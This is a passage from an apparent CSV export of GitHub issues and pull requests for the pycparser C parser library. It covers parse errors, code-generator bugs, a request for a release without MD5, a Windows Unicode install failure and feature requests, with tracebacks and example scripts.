Let me know if there's anything else you need to know about my environment to help resolve this issue. I've had to pin pycparser in my requirements.txt to 2.17, which works perfectly fine.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/197/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/197/comments,https://api.github.com/repos/eliben/pycparser/issues/197/events,https://github.com/eliben/pycparser/issues/197,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/196,240257344,MDU6SXNzdWUyNDAyNTczNDQ=,196,Release to remove MD5 requirement?,122261,closed,FALSE,NA,NA,1,2017-07-03T20:17:18Z,2017-07-04T22:19:53Z,2017-07-04T22:19:53Z,NONE,NA,"When install the Python module `cryptography`, the requirements of said package grab the latest released pycparser.  This does not include the recent commit of 3c0603d38ef46a4b7dc175420276abab35386c2f which removes the dependency on the MD5 hash function.

We're running a site that requires FIPS compliance, and unsafe cryptographic functions are disabled at a very low level (the kernel).  If we could get a release of pycparser, (at least to that commit), that would help us move on.  Manually installing the commit referenced above pacifies the failure observed when install `cryptography`.

Thanks!

SB",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/196/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/196/comments,https://api.github.com/repos/eliben/pycparser/issues/196/events,https://github.com/eliben/pycparser/issues/196,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/195,239978394,MDU6SXNzdWUyMzk5NzgzOTQ=,195,Generator generates incorrect code for 1-line type aliases,201287,open,FALSE,NA,NA,3,2017-07-01T23:33:19Z,2018-03-15T22:10:56Z,NA,NONE,NA,"The following code gets mis-generated & causes a compiler warning:

    struct a {};

    union {
            struct a b;
    } u, *uu = &u;

becomes

    struct a;
    union 
    {
      struct a b;
    } u;
    union 
    {
      struct a b;
    } *uu = & u;

Snippet:
    import sys
    from pycparserext.ext_c_parser import GnuCParser as CParser
    from pycparserext.ext_c_generator import GnuCGenerator as CGenerator

    source_parser = CParser()
    ast = source_parser.parse(sys.stdin.read())
    generator = CGenerator()
    print generator.visit(ast)

The problem with this is that if you try to compile this code the compiler will generate a warning that the variable uu is initialized from an incompatible pointer type because we've now generated 2 anonymous union names.

This is probably related (same root cause?) with structure aliases getting their own types too:

    typedef struct
    {
        int a;
    } B, C;

becomes:

    typedef struct 
    {
      int a;
    } B;
    typedef struct 
    {
      int a;
    } C;

which means that B & C are their own types instead of aliases to the same underlying type.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/195/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/195/comments,https://api.github.com/repos/eliben/pycparser/issues/195/events,https://github.com/eliben/pycparser/issues/195,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/194,239350260,MDU6SXNzdWUyMzkzNTAyNjA=,194,how to parser linux kernel for rewrite ast?,5094741,closed,FALSE,NA,NA,1,2017-06-29T02:37:38Z,2017-06-29T13:56:53Z,2017-06-29T13:56:53Z,NONE,NA,"```
martin@martin-Virtual-Machine:~/Downloads$ python showdef.py 
/home/martin/Downloads/linux-stable/Kconfig:2:3: error: invalid preprocessing directive #For
 # For a description of the syntax of this configuration file,
   ^
/home/martin/Downloads/linux-stable/Kconfig:3:3: error: invalid preprocessing directive #see
 # see Documentation/kbuild/kconfig-language.txt.
   ^
Traceback (most recent call last):
  File ""showdef.py"", line 61, in <module>
    show_func_defs(os.path.join(path, name))
  File ""showdef.py"", line 54, in show_func_defs
    ast = parse_file(filename, use_cpp=True,cpp_args=r'-Iutils/fake_libc_include')
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 151, in parse
    debug=debuglevel)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 1181, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 1721, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/plyparser.py"", line 55, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: /home/martin/Downloads/linux-stable/Kconfig:5:10: before: ""Linux/$ARCH $KERNELVERSION Kernel Configuration""
martin@martin-Virtual-Machine:~/Downloads$ gedit showdef.py 

(gedit:6246): Gtk-WARNING **: GtkScrolledWindow 0x86b0380 is mapped but visible child GtkScrollbar 0x86b2808 is not mapped

(gedit:6246): Gtk-WARNING **: GtkScrolledWindow 0x86b0380 is mapped but visible child GtkScrollbar 0x86b2990 is not mapped

(gedit:6246): Gtk-WARNING **: GtkScrolledWindow 0x86b0380 is mapped but visible child GtkScrollbar 0x86b2808 is not mapped

(gedit:6246): Gtk-WARNING **: GtkScrolledWindow 0x86b0380 is mapped but visible child GtkScrollbar 0x86b2990 is not mapped
martin@martin-Virtual-Machine:~/Downloads$ python showdef.py 
/home/martin/Downloads/linux-stable/virt/kvm/eventfd.c:24:28: fatal error: linux/kvm_host.h: No such file or directory
 #include <linux/kvm_host.h>
                            ^
compilation terminated.
/home/martin/Downloads/linux-stable/virt/kvm/vfio.c:13:24: fatal error: linux/file.h: No such file or directory
 #include <linux/file.h>
                        ^
compilation terminated.
/home/martin/Downloads/linux-stable/virt/kvm/coalesced_mmio.c:11:23: fatal error: kvm/iodev.h: No such file or directory
 #include <kvm/iodev.h>
                       ^
compilation terminated.
/home/martin/Downloads/linux-stable/virt/kvm/kvm_main.c:19:23: fatal error: kvm/iodev.h: No such file or directory
 #include <kvm/iodev.h>
                       ^
compilation terminated.
/home/martin/Downloads/linux-stable/virt/kvm/async_pf.c:23:28: fatal error: linux/kvm_host.h: No such file or directory
 #include <linux/kvm_host.h>
                            ^
compilation terminated.
/home/martin/Downloads/linux-stable/virt/kvm/irqchip.c:27:28: fatal error: linux/kvm_host.h: No such file or directory
 #include <linux/kvm_host.h>
                            ^
compilation terminated.
/home/martin/Downloads/linux-stable/virt/kvm/arm/arch_timer.c:19:23: fatal error: linux/cpu.h: No such file or directory
 #include <linux/cpu.h>
                       ^
compilation terminated.
/home/martin/Downloads/linux-stable/virt/kvm/arm/pmu.c:18:23: fatal error: linux/cpu.h: No such file or directory
 #include <linux/cpu.h>
                       ^
compilation terminated.
/home/martin/Downloads/linux-stable/virt/kvm/arm/aarch32.c:24:28: fatal error: linux/kvm_host.h: No such file or directory
 #include <linux/kvm_host.h>
                            ^
compilation terminated.
/home/martin/Downloads/linux-stable/virt/kvm/arm/vgic/vgic-mmio-v3.c:14:38: fatal error: linux/irqchip/arm-gic-v3.h: No such file or directory
 #include <linux/irqchip/arm-gic-v3.h>
                                      ^
compilation terminated.
/home/martin/Downloads/linux-stable/virt/kvm/arm/vgic/vgic-kvm-device.c:16:28: fatal error: linux/kvm_host.h: No such file or directory
 #include <linux/kvm_host.h>
                            ^
compilation terminated.
/home/martin/Downloads/linux-stable/virt/kvm/arm/vgic/vgic-irqfd.c:18:28: fatal error: linux/kvm_host.h: No such file or directory
 #include <linux/kvm_host.h>
                            ^
compilation terminated.
Traceback (most recent call last):
  File ""showdef.py"", line 63, in <module>
    show_func_defs(fullpath)
  File ""showdef.py"", line 54, in show_func_defs
    ast = parse_file(filename, use_cpp=True,cpp_args=r'-Iutils/fake_libc_include')
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 151, in parse
    debug=debuglevel)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 1181, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 1721, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/plyparser.py"", line 55, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: /usr/include/asm-generic/int-ll64.h:22:20: before: short
martin@martin-Virtual-Machine:~/Downloads$ 

```
```
#-----------------------------------------------------------------

# pycparser: func_defs.py

#

# Using pycparser for printing out all the functions defined in a

# C file.

#

# This is a simple example of traversing the AST generated by

# pycparser. Call it from the root directory of pycparser.

#

# Eli Bendersky [http://eli.thegreenplace.net]

# License: BSD

#-----------------------------------------------------------------

from __future__ import print_function
import sys
import os

# This is not required if you've installed pycparser into
# your site-packages/ with setup.py

sys.path.extend(['.', '..'])

from pycparser import c_parser, c_ast, parse_file





# A simple visitor for FuncDef nodes that prints the names and

# locations of function definitions.

class FuncDefVisitor(c_ast.NodeVisitor):
    def visit_FuncDef(self, node):
        print('%s at %s' % (node.decl.name, node.decl.coord))


def show_func_defs(filename):

    # Note that cpp is used. Provide a path to your own cpp or

    # make sure one exists in PATH.
    ast = parse_file(filename, use_cpp=True,cpp_args=r'-Iutils/fake_libc_include')
    v = FuncDefVisitor()
    v.visit(ast)

if __name__ == ""__main__"":
    for path, subdirs, files in os.walk(""/home/martin/Downloads/linux-stable""):
        for name in files:
            fullpath = os.path.join(path, name)
            if fullpath.endswith("".c""):
                show_func_defs(fullpath)

    
```

",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/194/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/194/comments,https://api.github.com/repos/eliben/pycparser/issues/194/events,https://github.com/eliben/pycparser/issues/194,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/193,239182228,MDU6SXNzdWUyMzkxODIyMjg=,193,ParseError,295386,closed,FALSE,NA,NA,1,2017-06-28T14:26:54Z,2017-06-28T15:39:27Z,2017-06-28T15:39:27Z,NONE,NA,"I have the following function in a file. The row `uint32_t __attribute__ ((unused)) dummy;` fails.

Any idea why?

```
void ReceiveMsg(void) {
  uint8_t j;
  uint32_t __attribute__ ((unused)) dummy;

  while (CAN_0.IFLAG1.B.BUF4TO1I != 8) {};  /* Wait for CAN_0 MB 4 flag */
  RxCODE   = CAN_0.MB[4].CS.B.CODE; 		/* Read CODE, ID, LENGTH, DATA, TIMESTAMP*/
  RxID     = CAN_0.MB[4].ID.B.ID_STD;
  RxLENGTH = CAN_0.MB[4].CS.B.DLC;
  for (j=0; j<RxLENGTH; j++) {
    RxDATA[j] = CAN_0.MB[4].DATA.B[j];
  }
  RxTIMESTAMP = CAN_0.MB[4].CS.B.TIMESTAMP;
  dummy = CAN_0.TIMER.R;             /* Read TIMER to unlock message buffers */
  CAN_0.IFLAG1.R = 0x00000010;       /* Clear CAN_0 MB 4 flag */

  if(RxDATA[0] == 'H')
  {
      SIUL2.MSCR[PA10].B.OBE = 1;  /* Pad PA10 (10): OBE=1. On EVB enable low DS4 LED */
  }
}
```

The parser recives the following error trace

 ```
 File ""C:\Users\user\AppData\Local\Programs\Python\Python36-32\lib\site-packages\pycparser\__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""C:\Users\user\AppData\Local\Programs\Python\Python36-32\lib\site-packages\pycparser\c_parser.py"", line 151, in parse
    debug=debuglevel)
  File ""C:\Users\user\AppData\Local\Programs\Python\Python36-32\lib\site-packages\pycparser\ply\yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""C:\Users\user\AppData\Local\Programs\Python\Python36-32\lib\site-packages\pycparser\ply\yacc.py"", line 1181, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""C:\Users\user\AppData\Local\Programs\Python\Python36-32\lib\site-packages\pycparser\ply\yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""C:\Users\user\AppData\Local\Programs\Python\Python36-32\lib\site-packages\pycparser\c_parser.py"", line 1721, in p_error
    column=self.clex.find_tok_column(p)))
  File ""C:\Users\user\AppData\Local\Programs\Python\Python36-32\lib\site-packages\pycparser\plyparser.py"", line 55, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: C:/Users/user/Documents/projects/nxp/poc_mpc/src/can.c:102:27: before: (
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/193/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/193/comments,https://api.github.com/repos/eliben/pycparser/issues/193/events,https://github.com/eliben/pycparser/issues/193,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/192,238895412,MDU6SXNzdWUyMzg4OTU0MTI=,192,How to parse macro as is?,4997735,closed,FALSE,NA,NA,1,2017-06-27T15:42:02Z,2017-06-27T18:41:51Z,2017-06-27T18:41:51Z,NONE,NA,An example of how to find all the functions is specified in the file func_defs.po. How can I find all the definitions of macros similarly?,NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/192/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/192/comments,https://api.github.com/repos/eliben/pycparser/issues/192/events,https://github.com/eliben/pycparser/issues/192,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/191,229725920,MDExOlB1bGxSZXF1ZXN0MTIxMzIwMzY1,191,C11 & GCC keywords support,1715611,closed,FALSE,NA,NA,1,2017-05-18T16:01:56Z,2017-12-31T12:57:05Z,2017-12-31T12:57:05Z,NONE,NA,"add support for basic C11 + GCC alternate keywords (""for use in header files"")

With this, the only bits still neccessary to strip from standard glibc headers shrinks down to:
```
__attribute__(x)
__extension__
__asm__(x)
__builtin_va_list
```",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/191/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/191/comments,https://api.github.com/repos/eliben/pycparser/issues/191/events,https://github.com/eliben/pycparser/pull/191,https://api.github.com/repos/eliben/pycparser/pulls/191
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/190,229688374,MDExOlB1bGxSZXF1ZXN0MTIxMjk0MDE2,190,Add support for continuing parsing & different start symbol,1715611,closed,FALSE,NA,NA,4,2017-05-18T14:14:53Z,2017-05-19T17:23:07Z,2017-05-19T16:38:51Z,NONE,NA,"Updated version of #120, with tests & demo. Also provides a superset of the (reverted) #159.

All feedback from both #120 and #159 should be addressed.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/190/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/190/comments,https://api.github.com/repos/eliben/pycparser/issues/190/events,https://github.com/eliben/pycparser/pull/190,https://api.github.com/repos/eliben/pycparser/pulls/190
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/188,222010371,MDExOlB1bGxSZXF1ZXN0MTE2MDU4ODg0,188,Add compound literal support to CGenerator,7778975,closed,FALSE,NA,NA,1,2017-04-16T13:28:32Z,2017-04-19T11:59:07Z,2017-04-19T11:58:59Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/188/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/188/comments,https://api.github.com/repos/eliben/pycparser/issues/188/events,https://github.com/eliben/pycparser/pull/188,https://api.github.com/repos/eliben/pycparser/pulls/188
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/187,221148383,MDU6SXNzdWUyMjExNDgzODM=,187,Feature request: Ability to provide preexisting typedefs to the parser,2498805,closed,FALSE,NA,NA,4,2017-04-12T04:25:37Z,2017-07-04T22:22:59Z,2017-07-04T22:22:59Z,NONE,NA,"Our usecase for pycparser is allowing the user to provide snippets of c variable and function declarations and we convert them to a domain-specific representation of the types used, useful for further analysis. This, as I understand, breaks an assumption baked into pycparser that it's parsing files which can be compiled, so there are complications. What we'd like to be able to do is allow the user of our tool to parse some typedefs and some variable declarations using those types separately. This means that right now, we have to prepend every string that we feed to `parse()` with all the prior typedefs, which is awkward since we don't have very good support for serializing our internal representation of the types back to strings.

What we'd like to be able to do is to provide a mapping, either to the `CParser` constructor or to `parse()`, of pre-established typedefs that it may use, either as strings or as ASTs, whatever is the most convenient.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/187/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/187/comments,https://api.github.com/repos/eliben/pycparser/issues/187/events,https://github.com/eliben/pycparser/issues/187,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/186,220150302,MDU6SXNzdWUyMjAxNTAzMDI=,186,Can't handle blocks in case of swtich statement,11706335,closed,FALSE,NA,NA,1,2017-04-07T08:49:52Z,2017-04-07T12:11:47Z,2017-04-07T12:11:47Z,NONE,NA,"code like this：
`

    switch (n)
    {
    case 1: {
        int i = 0;
        LOG(""%d"",i);
        break;
    }
    ........
    }

`",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/186/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/186/comments,https://api.github.com/repos/eliben/pycparser/issues/186/events,https://github.com/eliben/pycparser/issues/186,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/185,218851534,MDU6SXNzdWUyMTg4NTE1MzQ=,185,"UnicodeDecodeError while installing on Windows in a path containing an ""é"" ",239510,open,FALSE,NA,NA,2,2017-04-03T07:36:58Z,2017-09-04T21:55:31Z,NA,NONE,NA,"Hi,

I've seen a user failing to install pycparser 2.17 on a Windows environment using Power Shell, in a fresh python 3.6 venv (native python venv) located in a path containing the letter ""é"".

```
> py -m pip install pycparser
Collecting pycparser
  Using cached pycparser-2.17.tar.gz
Installing collected packages: pycparser
  Running setup.py install for pycparser ... error
Exception:
Traceback (most recent call last):
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\compat\__init__.py"", line 73, in console_to_str
    return s.decode(sys.__stdout__.encoding)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe9 in position 56: invalid continuation byte

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\commands\install.py"", line 342, in run
    prefix=options.prefix_path,
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\req\req_set.py"", line 784, in install
    **kwargs
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\req\req_install.py"", line 878, in install
    spinner=spinner,
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\utils\__init__.py"", line 676, in call_subprocess
    line = console_to_str(proc.stdout.readline())
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\compat\__init__.py"", line 75, in console_to_str
    return s.decode('utf_8')
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe9 in position 56: invalid continuation byte

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\commands\install.py"", line 385, in run
    requirement_set.cleanup_files()
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\req\req_set.py"", line 729, in cleanup_files
    req.remove_temporary_source()
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\req\req_install.py"", line 977, in remove_temporary_source
    rmtree(self.source_dir)
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\_vendor\retrying.py"", line 49, in wrapped_f
    return Retrying(*dargs, **dkw).call(f, *args, **kw)
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\_vendor\retrying.py"", line 212, in call
    raise attempt.get()
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\_vendor\retrying.py"", line 247, in get
    six.reraise(self.value[0], self.value[1], self.value[2])
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\_vendor\six.py"", line 686, in reraise
    raise value
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\_vendor\retrying.py"", line 200, in call
    attempt = Attempt(fn(*args, **kwargs), attempt_number, False)
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\utils\__init__.py"", line 102, in rmtree
    onerror=rmtree_errorhandler)
  File ""C:\Users\Cécile\AppData\Local\Programs\Python\Python36-32\lib\shutil.py"", line 488, in rmtree
    return _rmtree_unsafe(path, onerror)
  File ""C:\Users\Cécile\AppData\Local\Programs\Python\Python36-32\lib\shutil.py"", line 387, in _rmtree_unsafe
    onerror(os.rmdir, path, sys.exc_info())
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\utils\__init__.py"", line 114, in rmtree_errorhandler
    func(path)
PermissionError: [WinError 32] Le processus ne peut pas accéder au fichier car ce fichier est utilisé par un autre processus: 'C:\\Users\\CCIL
E~1\\AppData\\Local\\Temp\\pip-build-fmbcsj3r\\pycparser'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\basecommand.py"", line 215, in main
    status = self.run(options, args)
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\commands\install.py"", line 385, in run
    requirement_set.cleanup_files()
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\utils\build.py"", line 38, in __exit__
    self.cleanup()
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\utils\build.py"", line 42, in cleanup
    rmtree(self.name)
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\_vendor\retrying.py"", line 49, in wrapped_f
    return Retrying(*dargs, **dkw).call(f, *args, **kw)
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\_vendor\retrying.py"", line 212, in call
    raise attempt.get()
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\_vendor\retrying.py"", line 247, in get
    six.reraise(self.value[0], self.value[1], self.value[2])
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\_vendor\six.py"", line 686, in reraise
    raise value
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\_vendor\retrying.py"", line 200, in call
    attempt = Attempt(fn(*args, **kwargs), attempt_number, False)
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\utils\__init__.py"", line 102, in rmtree
    onerror=rmtree_errorhandler)
  File ""C:\Users\Cécile\AppData\Local\Programs\Python\Python36-32\lib\shutil.py"", line 488, in rmtree
    return _rmtree_unsafe(path, onerror)
  File ""C:\Users\Cécile\AppData\Local\Programs\Python\Python36-32\lib\shutil.py"", line 378, in _rmtree_unsafe
    _rmtree_unsafe(fullname, onerror)
  File ""C:\Users\Cécile\AppData\Local\Programs\Python\Python36-32\lib\shutil.py"", line 387, in _rmtree_unsafe
    onerror(os.rmdir, path, sys.exc_info())
  File ""C:\Users\Cécile\[redacted]\lib\site-packages\pip\utils\__init__.py"", line 114, in rmtree_errorhandler
    func(path)

PermissionError: [WinError 32] Le processus ne peut pas accéder au fichier car ce fichier est utilisé par un autre processus: 'C:\\Users\\CCIL
E~1\\AppData\\Local\\Temp\\pip-build-fmbcsj3r\\pycparser'
```

I was unable to reproduce it on Linux, and I no longer have access to a Windows machine, so if someone can reproduce it, it may be worth fixing it.

The short time I had access to the machine told me that `setup.py install` is printing the path in a lot of debug lines, it may print it in latin-1 instead of utf-8, but I didn't had the time to find why.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/185/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/185/comments,https://api.github.com/repos/eliben/pycparser/issues/185/events,https://github.com/eliben/pycparser/issues/185,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/184,217274394,MDExOlB1bGxSZXF1ZXN0MTEyNzY1NDE5,184,Updates vendored PLY library to v3.10,8457307,closed,FALSE,NA,NA,0,2017-03-27T14:58:37Z,2017-04-03T14:45:37Z,2017-04-03T13:42:49Z,CONTRIBUTOR,NA,"Updates PLY to v3.10. The prior version, v3.9, was causing an exception on FIPS-enabled machines due to the use of `md5` in `ply.yacc.signature()`.

Fixes #175 ",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/184/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/184/comments,https://api.github.com/repos/eliben/pycparser/issues/184/events,https://github.com/eliben/pycparser/pull/184,https://api.github.com/repos/eliben/pycparser/pulls/184
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/183,214705093,MDExOlB1bGxSZXF1ZXN0MTExMDY4MTQ0,183,Add fakedef,6367936,closed,FALSE,NA,NA,1,2017-03-16T13:32:20Z,2017-03-16T13:47:55Z,2017-03-16T13:47:55Z,CONTRIBUTOR,NA,Add mir and xcb typedef,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/183/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/183/comments,https://api.github.com/repos/eliben/pycparser/issues/183/events,https://github.com/eliben/pycparser/pull/183,https://api.github.com/repos/eliben/pycparser/pulls/183
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/182,214529902,MDExOlB1bGxSZXF1ZXN0MTEwOTQ0OTgx,182,Add xcb includes to fake includes,6367936,closed,FALSE,NA,NA,0,2017-03-15T21:21:04Z,2017-03-16T13:31:41Z,2017-03-16T13:31:41Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/182/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/182/comments,https://api.github.com/repos/eliben/pycparser/issues/182/events,https://github.com/eliben/pycparser/pull/182,https://api.github.com/repos/eliben/pycparser/pulls/182
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/181,214527009,MDExOlB1bGxSZXF1ZXN0MTEwOTQzMzAw,181,Add Mir typedefs in fake headers,6367936,closed,FALSE,NA,NA,3,2017-03-15T21:11:43Z,2017-03-16T13:31:49Z,2017-03-16T13:31:49Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/181/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/181/comments,https://api.github.com/repos/eliben/pycparser/issues/181/events,https://github.com/eliben/pycparser/pull/181,https://api.github.com/repos/eliben/pycparser/pulls/181
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/180,214439571,MDExOlB1bGxSZXF1ZXN0MTEwODc5OTA0,180,Add basic XLib objects in fake package of pycparser,6367936,closed,FALSE,NA,NA,0,2017-03-15T16:03:19Z,2017-03-16T12:46:52Z,2017-03-16T12:46:52Z,CONTRIBUTOR,NA,Needed for packages importing XLib.h,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/180/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/180/comments,https://api.github.com/repos/eliben/pycparser/issues/180/events,https://github.com/eliben/pycparser/pull/180,https://api.github.com/repos/eliben/pycparser/pulls/180
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/179,213553752,MDU6SXNzdWUyMTM1NTM3NTI=,179,Can't parse Linux Kernel Source (2.6.32),18262221,closed,FALSE,NA,NA,2,2017-03-11T19:36:16Z,2017-03-11T22:28:44Z,2017-03-11T22:28:44Z,NONE,NA,"Hi, tried to parse the Linux Kernel Source by this program:

```
import os
import sys

import pprint
import mmap
import pycparser

from __future__ import print_function
temp_path=""/public/linux-kernel/linux-2.6.32.41""

sys.path.extend(['.', '..'])

from pycparser import c_parser, c_ast, parse_file


class FuncDefVisitor(c_ast.NodeVisitor):
	def visit_FuncDef(self, node):
		print('%s at %s' % (node.decl.name, node.decl.coord))


def show_func_defs(filename):
	# Note that cpp is used. Provide a path to your own cpp or
	# make sure one exists in PATH.
	ast = parse_file(filename, use_cpp=True,\
					 cpp_args=r'-Iutils/fake_libc_include')

	v = FuncDefVisitor()
	v.visit(ast)

if __name__ == ""__main__"":
	start_dir=""""
	if len(sys.argv) > 1:
		start_dir = sys.argv[1]

	if len(start_dir) == 0:
		start_dir=temp_path

	for folder, subs, files in os.walk(start_dir):
		for filename in files:
			fpath=os.path.join(folder, filename)
			filename_n, file_extension = os.path.splitext(fpath)
			print file_extension
			if file_extension in [ "".c"", "".cc"", "".cpp"", "".h"", "".hpp"" ]:
				show_func_defs(fpath)

```
But got as result:
```
Traceback (most recent call last):
  File ""func_defs.py"", line 61, in <module>
    show_func_defs(fpath)
  File ""func_defs.py"", line 42, in show_func_defs
    cpp_args=r'-Iutils/fake_libc_include')
  File ""/usr/lib/python2.7/dist-packages/pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/usr/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 138, in parse
    debug=debuglevel)
  File ""/usr/lib/python2.7/dist-packages/ply/yacc.py"", line 269, in parse
    return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
  File ""/usr/lib/python2.7/dist-packages/ply/yacc.py"", line 1051, in parseopt_notrack
    tok = self.errorfunc(errtoken)
  File ""/usr/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 1613, in p_error
    column=self.clex.find_tok_column(p)))
